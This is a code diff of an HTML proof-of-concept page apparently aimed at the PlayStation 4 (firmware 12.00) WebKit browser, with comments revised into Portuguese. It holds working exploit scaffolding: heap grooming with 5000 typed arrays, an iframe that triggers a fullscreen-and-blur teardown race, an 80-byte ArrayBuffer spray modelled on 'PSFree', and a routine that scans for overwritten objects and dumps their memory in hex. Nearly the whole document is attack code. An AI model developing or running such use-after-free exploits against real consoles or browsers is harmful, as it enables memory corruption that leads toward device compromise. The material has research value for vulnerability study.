@@ -1,46 +1,52 @@
-
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 - Fullscreen Teardown UAF PoC</title>
+    <title>PS4 12.00 - Leandro Trigger + PSFree Memory</title>
     <style>
         body { background-color: #1a1a1a; color: #fff; font-family: monospace; padding: 20px; }
-        button { padding: 15px; font-weight: bold; cursor: pointer; background: #e0e0e0; color: #000; border-radius: 5px; }
-        #log-area { background: #000; color: #0f0; padding: 15px; border: 1px solid #333; height: 250px; overflow-y: scroll; display: none; margin-top: 20px;}
+        button { padding: 12px; font-weight: bold; cursor: pointer; margin-right: 10px; border-radius: 5px; }
+        #log-area { background: #000; color: #0f0; padding: 15px; border: 1px solid #444; height: 350px; overflow-y: scroll; display: none; margin-top: 20px;}
+        .highlight { color: #fff; background-color: #d32f2f; padding: 2px; }
     </style>
 </head>
 <body>
 
-    <h2>PlayStation 4 (FW 12.00) - WebKit Use-After-Free</h2>
-    <p><b>Bug Type:</b> Memory Corruption via Fullscreen Teardown Race Condition</p>
-    <p>Status: <span id="status" style="color: #ffeb3b;">Waiting for preparation...</span></p>
+    <h2>PS4 12.00 - Fullscreen Teardown (PSFree Memory)</h2>
+    <p>Status: <span id="status" style="color: #ffeb3b;">Aguardando...</span></p>
 
-    <button onclick="prepareMemory()">1. Allocate Target Objects</button>
-    <button onclick="injectTrigger()">2. Trigger Race Condition (Fullscreen -> Options)</button>
-    <button onclick="verifyLeak()" style="background: #4caf50; color: #fff;">3. Verify Memory Corruption</button>
+    <button onclick="prepareMemory()" style="background: #e0e0e0; color: #000;">1. Preparar Objetos (80 bytes)</button>
+    <button onclick="injectTrigger()" style="background: #e0e0e0; color: #000;">2. Injetar Gatilho (Fullscreen + Blur)</button>
+    <button onclick="verifyLeak()" style="background: #4caf50; color: #fff;">3. Memory Dump</button>
 
     <div id="log-area"></div>
     <div id="frame-container" style="margin-top: 20px;"></div>
 
     <script>
-        const PATTERN = 2.121995791e-314; // 0x4141414141414141
+        // O tamanho exato do objeto do PSFree para PS4 >= 9.00
+        const ssv_len = 0x50; // 80 bytes
+        
         let controllers = [];
         const statusEl = document.getElementById('status');
         const logArea = document.getElementById('log-area');
 
-        // Step 1: Heap Grooming
+        // ==========================================
+        // PASSO 1: PREPARAÇÃO (Base de 80 bytes)
+        // ==========================================
         function prepareMemory() {
             controllers = [];
             for(let i = 0; i < 5000; i++) {
-                let arr = new Float64Array(8); // 64 bytes allocation
-                arr[0] = i; 
+                // Float64Array(10) = 80 bytes. Mantemos isso para podermos ler como números no final.
+                let arr = new Float64Array(10);
+                arr[0] = i;
                 controllers.push(arr);
             }
-            statusEl.innerText = "Target objects allocated in memory.";
+            statusEl.innerText = "5000 Objetos Prontos (80 bytes).";
         }
 
-        // Step 2: Triggering the Teardown UAF
+        // ==========================================
+        // PASSO 2: O SEU GATILHO + PSFREE SPRAY
+        // ==========================================
         function injectTrigger() {
             const container = document.getElementById('frame-container');
             container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:2px dashed red;"></iframe>';
@@ -49,41 +55,49 @@
             fDoc.open();
             fDoc.write(`
                 <html><body style="background:#fff; text-align:center;">
-                    <button onclick="startPoC()" style="padding:15px; background:#f44336; color:#fff; font-weight:bold;">ENTER FULLSCREEN</button>
+                    <button onclick="startPoC()" style="padding:15px; background:#f44336; color:#fff; font-weight:bold;">START FS + OPTIONS</button>
                     <script>
-                        window.startPoC = function() {
-                            if (document.documentElement.webkitRequestFullscreen) 
-                                document.documentElement.webkitRequestFullscreen();
+                        function startPoC() {
+                            // 1. O seu gatilho de Fullscreen
+                            document.documentElement.webkitRequestFullscreen();
                             
-                            window.onblur = function() { // Triggered by pressing 'Options' button
+                            // 2. O seu gatilho de Blur (Botão Options)
+                            window.onblur = function() {
                                 let spray = [];
-                                for(let i = 0; i < 8000; i++) {
-                                    let p = new Float64Array(10);
-                                    p.fill(${PATTERN});
-                                    spray.push(p);
-                                }
                                 
+                                // 3. O SPRAY EXATO DO PSFREE (psfree.mjs linha 191)
+                                // Em vez de Float64Array, usamos Uint8Array com ArrayBuffer bruto
+                                for (let i = 0; i < 8000; i++) {
+                                    let view = new Uint8Array(new ArrayBuffer(0x50)); // 80 bytes
+                                    view.fill(0x41); // Preenche com 0x41 ('A')
+                                    spray.push(view);
+                                }
+
+                                // 4. O seu Teardown original dentro do Iframe
                                 setTimeout(() => {
                                     document.open();
-                                    document.write('<h2 style="color:green;">TEARDOWN COMPLETE</h2>');
+                                    document.write('<h2 style="color:green;">TEARDOWN FINALIZADO</h2>');
                                     document.close();
                                 }, 1000);
                             };
-                        };
+                        }
                     <\/script>
                 </body></html>
             `);
             fDoc.close();
-            statusEl.innerText = "Iframe ready. Press Fullscreen, then press 'Options' button.";
+            statusEl.innerText = "Iframe Pronto. Use a sua sequência: FS -> OPTIONS.";
         }
 
-        // Step 3: Verification
+        // ==========================================
+        // PASSO 3: VERIFICAÇÃO DE CORRUPÇÃO
+        // ==========================================
         function verifyLeak() {
             let corrupted = null;
             let corruptedIndex = -1;
 
             for(let i = 0; i < controllers.length; i++) {
-                if (controllers[i][0] !== i) { // Detects any overwrite
+                // Se o ID original mudou, o OS colocou os dados do ArrayBuffer do PSFree aqui em cima!
+                if (controllers[i][0] !== i) { 
                     corrupted = controllers[i];
                     corruptedIndex = i;
                     break;
@@ -91,22 +105,26 @@
             }
 
             logArea.style.display = "block";
-            
+            logArea.innerHTML = "<b>[ DUMP DA MEMÓRIA - 0x50 BYTES ]</b><br><br>";
+
             if (corrupted) {
-                statusEl.innerHTML = "<span style='color:#4caf50;'>✓ VULNERABILITY CONFIRMED!</span>";
-                logArea.innerHTML = "<b>[ MEMORY CORRUPTION DETECTED ]</b><br><br>";
-                logArea.innerHTML += "Object ID " + corruptedIndex + " was overwritten after iframe teardown.<br>";
-                logArea.innerHTML += "Gigacage zero-fill or pattern overlap confirmed.<br><br>";
+                statusEl.innerHTML = "<span style='color:#4caf50;'>✓ SUCESSO! ID Corrompido: " + corruptedIndex + "</span>";
                 
-                for(let i = 0; i < 8; i++) {
+                for(let i = 0; i < 10; i++) {
+                    const val = corrupted[i];
                     const buf = new ArrayBuffer(8);
-                    new Float64Array(buf)[0] = corrupted[i];
-                    const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
-                    logArea.innerHTML += "Offset [" + i + "]: 0x" + hex + "<br>";
+                    new Float64Array(buf)[0] = val;
+                    const hexStr = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
+                    
+                    // Como preenchemos o Uint8Array com 0x41, o valor esperado de corrupção é 0x4141414141414141
+                    let isPattern = hexStr.includes("41414141");
+                    let css = isPattern ? "class='highlight'" : "";
+                    
+                    logArea.innerHTML += "Offset [" + i + "]: <span " + css + ">0x" + hexStr + "</span><br>";
                 }
             } else {
-                statusEl.innerHTML = "<span style='color:#f44336;'>✗ No corruption. Please restart browser.</span>";
-                logArea.innerHTML = "Race condition failed. The OS managed the memory correctly this time.";
+                statusEl.innerHTML = "<span style='color:#f44336;'>✗ FALHA: Corrupção não detectada.</span>";
+                logArea.innerHTML += "O GC agiu antes ou os blocos não se alinharam. Atualize a página e repita.";
             }
         }
     </script>
